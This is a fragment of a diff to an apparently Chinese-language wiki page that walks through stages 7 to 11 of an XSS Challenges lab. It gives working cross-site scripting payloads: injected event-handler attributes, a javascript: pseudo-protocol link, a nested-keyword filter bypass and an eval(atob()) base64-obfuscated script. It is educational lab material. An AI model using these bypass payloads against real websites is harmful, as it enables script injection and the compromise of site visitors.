 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259390.png" alt="image-20230203203744967"></p>
 <h2 id="Stage-7">Stage #7</h2>
 <p>注入点还是在<code>input</code>标签的<code>value</code>属性中，但依旧是过滤了<code>&lt;&gt;</code>和<code>&quot;</code></p>
-<pre><code class="language-js">&quot; onmouseover=alert(document.domain)
-// 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性
-
-321 οnmοuseοver=alert(document.domain)
-321 onclick=alert(document.domain)
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; onmouseover=alert(document.domain)</span><br><span class="hljs-string">// 321 会写入 input 的 value 值中，空格做个分隔，写后面的属性</span><br><span class="hljs-string"></span><br><span class="hljs-string">321 οnmοuseοver=alert(document.domain)</span><br><span class="hljs-string">321 onclick=alert(document.domain)</span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259419.png" alt="image-20230203210616266"></p>
 <center style="color:#C0C0C0;text-decoration:underline">查看过滤</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259907.png" alt="image-20230203211148732"></p>
 <center style="color:#C0C0C0;text-decoration:underline">用点击事件</center>
 <h2 id="Stage-8">Stage #8</h2>
 <p>输入字符发现注入点在<code>a</code>标签的<code>href</code>属性中，随即想到<code>JavaScript 伪协议</code>绕过（需要点一下链接才能弹窗）</p>
-<pre><code class="language-js">// javascript 伪协议
-// &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式
-javascript:alert(document.domain);
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// javascript 伪协议</span><br><span class="hljs-comment">// &lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL，href 属性的值可以是 JavaScript 表达式</span><br><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">domain</span>);<br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259393.png" alt="image-20230203225405149"></p>
 <center style="color:#C0C0C0;text-decoration:underline">定位</center>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259505.png" alt="image-20230203225809485"></p>
@@ -261,14 +227,7 @@ javascript:alert(document.domain);
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259962.png" alt="image-20230203235513643"></p>
 <h2 id="Stage-10">Stage #10</h2>
 <p>定位在<code>input</code>标签的<code>value</code>属性中，但<code>domain</code>过滤了，可以使用嵌套绕过的方式</p>
-<pre><code class="language-js">// 嵌套绕过
-&quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt;
-
-// 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行
-// eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行
-alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==
-&quot;&gt;&lt;script&gt;eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='));&lt;/script&gt;
-</code></pre>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 嵌套绕过</span><br><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(document.domadomainin)&lt;/script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 看其他人有用 base 64 编码的方式来绕过的，但是需要解密函数 atob() 对字符串进行解密再进行执行</span><br><span class="hljs-string">// eval()函数计算 JavaScript 字符串，并把它作为脚本代码来执行</span><br><span class="hljs-string">alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==</span><br><span class="hljs-string">&quot;</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-title function_">atob</span>(<span class="hljs-string">&#x27;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#x27;</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/XSS%20Challenges/202410070259559.png" alt="image-20230204000534226"></p>
 <center style="color:#C0C0C0;text-decoration:underline">嵌套</center>
 <h2 id="Stage-11">Stage #11</h2>
@@ -276,7 +235,7 @@ alert(document.domain) 经过 base 64 编码后，YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ
 
 <div class="article-footer fs14"></div>
 </article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game.html">Google XSS Game</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/XSS-and-Security-Labs/xss-labs.html">xss-labs</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/XSS-and-Security-Labs/Google%20XSS%20Game">Google XSS Game</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/XSS-and-Security-Labs/xss-labs">xss-labs</a></div></section></div>
 
 
 
